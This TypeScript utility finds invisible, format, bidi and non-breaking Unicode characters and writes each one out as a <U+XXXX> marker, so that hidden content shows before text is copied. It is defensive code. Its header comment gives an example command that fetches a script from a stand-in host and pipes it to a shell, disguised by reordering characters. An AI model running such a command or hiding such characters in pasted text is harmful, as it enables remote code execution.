// Characters a text box does not draw as themselves (#2615) — controls it draws as nothing, zero-width,
// format and default-ignorable characters (variation selectors, the tag block, Hangul fillers), bidi
// controls that reorder what is around them, and blanks that do not break a line (a run of them pushes
// the rest of the line out of sight). With them a line can read `true; #;curl evil.sh|sh` and paste as
// `true; curl evil.sh|sh;# `, so a block shown before it is copied writes each one out as `<U+XXXX>`.
//
// Decided by Unicode property rather than a list of ranges, which missed whole classes. Left alone:
// space, tab, newline, CRLF, and the joiners and selectors inside an emoji (`❤️`, a ZWJ family), which a
// text box draws as the emoji — flagging those would make the warning cry wolf on ordinary text.
//
// Pure: text in, the text with each one written out and how many there were out.

const INVISIBLE = /[\p{Cc}\p{Cf}\p{Zs}\p{Zl}\p{Zp}\p{Co}\p{Default_Ignorable_Code_Point}⠀]/u;
const PICTOGRAPHIC = /[\p{Extended_Pictographic}\p{Emoji_Modifier}]/u;
const KEYCAP_BASE = /[0-9#*]/;
const DRAWN_AS_ITSELF = new Set([" ", "\t", "\n"]);
const PRESENTATION_SELECTORS = new Set(["︎", "️", "⃣"]);
const ZERO_WIDTH_JOINER = "‍";

// How far back a selector looks for its emoji: real sequences are a few characters long, and an
// unbounded look turns a block of ten thousand selectors into a hundred million steps.
const MAX_SELECTOR_RUN = 4;

/** The character before `index` that an emoji selector or joiner attaches to, past any selectors. */
function emojiBaseBefore(characters: string[], index: number): string {
  const before = characters.slice(Math.max(0, index - MAX_SELECTOR_RUN), index).reverse();
  return before.find((character) => !PRESENTATION_SELECTORS.has(character)) ?? "";
}

/** A selector or joiner that is part of an emoji — drawn as the emoji, not hidden. */
function isPartOfEmoji(characters: string[], index: number): boolean {
  const character = characters[index] ?? "";
  const base = emojiBaseBefore(characters, index);
  if (PRESENTATION_SELECTORS.has(character)) return PICTOGRAPHIC.test(base) || KEYCAP_BASE.test(base);
  return character === ZERO_WIDTH_JOINER && PICTOGRAPHIC.test(base) && PICTOGRAPHIC.test(characters[index + 1] ?? "");
}

function isHiddenAt(characters: string[], index: number): boolean {
  const character = characters[index] ?? "";
  if (DRAWN_AS_ITSELF.has(character)) return false;
  // A CR alone is drawn as a line break but pasted as Enter; in CRLF it is part of the line ending.
  if (character === "\r") return characters[index + 1] !== "\n";
  return INVISIBLE.test(character) && !isPartOfEmoji(characters, index);
}

const HEX_DIGITS = 4;
const marker = (character: string): string => `<U+${(character.codePointAt(0) ?? 0).toString(16).toUpperCase().padStart(HEX_DIGITS, "0")}>`;

export interface RevealedText {
  /** The text with every hidden character written as `<U+XXXX>`. */
  shown: string;
  hidden: number;
}

export function revealHidden(text: string): RevealedText {
  const characters = [...text];
  const hiddenAt = characters.map((_, index) => isHiddenAt(characters, index));
  return {
    shown: characters.map((character, index) => (hiddenAt[index] ? marker(character) : character)).join(""),
    hidden: hiddenAt.filter(Boolean).length,
  };
}
